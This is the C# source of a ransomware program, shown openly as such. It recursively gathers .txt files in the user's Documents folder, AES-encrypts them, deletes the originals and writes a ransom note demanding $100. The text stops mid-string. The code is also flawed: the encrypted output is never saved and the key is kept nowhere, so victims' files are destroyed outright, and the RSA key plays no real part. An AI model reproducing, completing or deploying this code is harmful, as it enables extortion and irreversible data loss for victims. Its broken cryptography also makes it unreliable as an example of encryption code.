using System;
using System.IO;
using System.Security.Cryptography;
using System.Text;

namespace Ransomware
{
    class Program
    {
        const int EncryptionKeySize = 256;
        const int BlockSize = 128;
        const int SaltSize = 128;
        const int Iterations = 10000;
        const double RansomAmount = 100.0;

        static void Main(string[] args)
        {
            byte[] encryptionKey = GenerateEncryptionKey();
            string publicKey = GeneratePublicKey();

            string[] filesToEncrypt = Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments), "*.txt", SearchOption.AllDirectories);

            foreach (string file in filesToEncrypt)
            {
                string encryptedFile = EncryptFile(file, encryptionKey);
                File.Delete(file);
            }

            string ransomNote = GenerateRansomNote(publicKey);
            File.WriteAllText("RansomNote.txt", ransomNote);

            Console.WriteLine("All your files have been encrypted! Pay the ransom amount of $" + RansomAmount + " to receive your files back.");
            Console.ReadLine();
        }

        static byte[] GenerateEncryptionKey()
        {
            using (Aes aes = Aes.Create())
            {
                aes.KeySize = EncryptionKeySize;
                aes.BlockSize = BlockSize;
                return aes.Key;
            }
        }

        static string GeneratePublicKey()
        {
            using (RSA rsa = RSA.Create())
            {
                return rsa.ToXmlString(false);
            }
        }

        static string EncryptFile(string filePath, byte[] encryptionKey)
        {
            byte[] salt = GenerateSalt();
            byte[] iv = GenerateIV();

            using (Aes aes = Aes.Create())
            {
                aes.KeySize = EncryptionKeySize;
                aes.BlockSize = BlockSize;
                aes.Key = encryptionKey;
                aes.IV = iv;

                using (ICryptoTransform encryptor = aes.CreateEncryptor())
                using (MemoryStream memoryStream = new MemoryStream())
                using (CryptoStream cryptoStream = new CryptoStream(memoryStream, encryptor, CryptoStreamMode.Write))
                using (FileStream fileStream = File.OpenRead(filePath))
                {
                    fileStream.CopyTo(cryptoStream);
                    cryptoStream.FlushFinalBlock();

                    byte[] encryptedBytes = memoryStream.ToArray();
                    byte[] result = new byte[salt.Length + iv.Length + encryptedBytes.Length];
                    Buffer.BlockCopy(salt, 0, result, 0, salt.Length);
                    Buffer.BlockCopy(iv, 0, result, salt.Length, iv.Length);
                    Buffer.BlockCopy(encryptedBytes, 0, result, salt.Length + iv.Length, encryptedBytes.Length);
                    return Convert.ToBase64String(result);
                }
            }
        }

        static byte[] GenerateSalt()
        {
            using (RNGCryptoServiceProvider random = new RNGCryptoServiceProvider())
            {
                byte[] salt = new byte[SaltSize / 8];
                random.GetBytes(salt);
                return salt;
            }
        }

        static byte[] GenerateIV()
        {
            using (RNGCryptoServiceProvider random = new RNGCryptoServiceProvider())
            {
                byte[] iv = new byte[BlockSize / 8];
                random.GetBytes(iv);
                return iv;
            }
        }

        static string GenerateRansomNote(string publicKey)
        {
            return string.Format("Your files have been encrypted with AES-256 encryption. To decrypt them, send {